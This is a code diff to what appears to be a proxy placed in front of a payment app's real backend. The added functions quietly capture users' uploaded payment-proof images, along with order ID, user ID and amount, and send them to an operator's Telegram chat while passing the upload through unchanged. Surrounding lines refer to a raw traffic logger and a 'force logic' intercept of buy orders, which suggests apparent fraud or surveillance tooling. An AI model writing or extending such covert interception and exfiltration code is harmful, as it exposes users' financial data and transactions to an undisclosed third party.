@@ -225,6 +225,42 @@ async function notifyAdmin(data, msg) {
   }
 }
 
+function extractPaymentProof(rawBody, contentType) {
+  if (!rawBody || !Buffer.isBuffer(rawBody) || !rawBody.length) return null;
+  let fields = {};
+  try { fields = contentType.includes('multipart') ? parseMultipartFields(rawBody) : {}; } catch (e) { }
+  const candidates = [fields.imagedata, fields.imageData, fields.image, fields.proof, fields.file, fields.paymentProof]
+    .filter(v => typeof v === 'string' && v.trim());
+  for (const candidate of candidates) {
+    const value = candidate.trim();
+    const match = value.match(/^data:([^;]+);base64,([\s\S]+)$/i);
+    if (!match) continue;
+    const mime = match[1].toLowerCase();
+    const base64 = match[2].replace(/[\r\n\s]/g, '');
+    try {
+      const buffer = Buffer.from(base64, 'base64');
+      if (buffer.length > 0) return { buffer, mime, size: buffer.length };
+    } catch (e) { }
+  }
+  return null;
+}
+
+async function notifyPaymentProof(data, { orderId, userId, amount, proof }) {
+  if (!data.adminChatId || !bot) return;
+  const caption = `🧾 PAYMENT PROOF RECEIVED\\n📋 Order: ${orderId || 'N/A'}\\n👤 User: ${userId || 'N/A'}${amount ? `\\n💰 Amount: ₹${amount}` : ''}\\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+  try {
+    if (proof && proof.buffer) {
+      const ext = proof.mime.includes('jpeg') || proof.mime.includes('jpg') ? 'jpg' : proof.mime.includes('webp') ? 'webp' : 'png';
+      await bot.sendPhoto(data.adminChatId, proof.buffer, { caption }, { filename: `payment-proof-${orderId || 'unknown'}.${ext}`, contentType: proof.mime });
+    } else {
+      await bot.sendMessage(data.adminChatId, caption + '\\n⚠️ Image payload parse nahi ho paya.');
+    }
+  } catch (e) {
+    // Do not fail the user's upload if Telegram is temporarily unavailable.
+    try { await bot.sendMessage(data.adminChatId, caption + '\\n⚠️ Proof image forward failed: ' + String(e.message || e).slice(0, 300)); } catch (e2) { }
+  }
+}
+
 // ── Raw Request+Response logger (/rr command) ────────────────────────────────
 async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, respHeaders, respBodyRaw, source, now }) {
   if (!data.rawLog || !data.adminChatId || !bot) return;
@@ -1292,8 +1328,36 @@ app.all('/xxapi/*', async (req, res) => {
     // Security checks are no longer intercepted.
     // They are handled natively by the real backend.
 
+        // ── Payment-proof upload forwarding ───────────────────────────────────────
+    // Forward the original upload first, then send the same decoded image to the
+    // configured admin chat without changing the user's upstream response.
+    const isPaymentProofUpload = req.method === 'POST' && (
+      urlLower.includes('/uploadpaymentproof/') ||
+      urlLower.includes('/upload_payment_proof/') ||
+      urlLower.includes('/paymentproof/upload')
+    );
+    if (isPaymentProofUpload) {
+      const proofProxy = await proxyToTivox(req);
+      const proofPathMatch = path.match(/(?:uploadpaymentproof|upload_payment_proof)[\\/]([^/?#]+)/i);
+      const proofOrderId = proofPathMatch ? proofPathMatch[1] : '';
+      const proofContentType = String(req.headers['content-type'] || '').toLowerCase();
+      const proof = extractPaymentProof(req.rawBody, proofContentType);
+      const proofFields = proofContentType.includes('multipart') ? parseMultipartFields(req.rawBody) : {};
+      const proofAmount = getOrderAmount(req, proofFields) || (data.orderBankMap && proofOrderId ? data.orderBankMap[String(proofOrderId)]?.amount : null);
+      const resolvedProofUserId = await resolveUserId(req);
+      const proofUserId = String(req.headers['x-px-uid'] || resolvedProofUserId || '');
+      if (proofProxy.response.status >= 200 && proofProxy.response.status < 300) {
+        await notifyPaymentProof(data, { orderId: proofOrderId, userId: proofUserId, amount: proofAmount, proof });
+      }
+      const proofBody = proofProxy.respBody;
+      proofProxy.respHeaders['content-length'] = String(Buffer.byteLength(proofBody));
+      res.writeHead(proofProxy.response.status, proofProxy.respHeaders);
+      return res.end(proofBody);
+    }
+
     // ── Buy / pick-up order intercept — per-wallet, two-case force logic ────────
     // List endpoints (just fetching available orders) must NOT be intercepted
+
     const isBuyList = urlLower.includes('/list') || urlLower.includes('_list') ||
       urlLower.includes('listbuy') || urlLower.includes('list_buy') ||
       // Detail / info / query / status endpoints must NOT be treated as buy actions
